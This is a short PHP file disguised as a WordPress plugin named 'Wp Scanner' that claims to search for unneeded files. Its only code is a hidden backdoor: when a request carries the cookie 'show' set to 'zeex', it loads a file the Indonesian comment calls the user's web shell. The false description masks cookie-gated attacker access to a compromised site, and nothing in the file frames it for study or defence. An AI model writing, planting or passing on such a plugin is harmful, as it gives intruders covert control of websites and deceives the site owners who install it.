<?php
/**
* Plugin Name: Wp Scanner
* Description: Search for all files that are no longer needed.
* Version: 2.0.0
* Author: ZeeX_IND
*/

if (isset($_COOKIE["show"]) and $_COOKIE["show"] == "zeex") {
   include "htacces.php"; // Lokasi web shell kalian
   exit;
}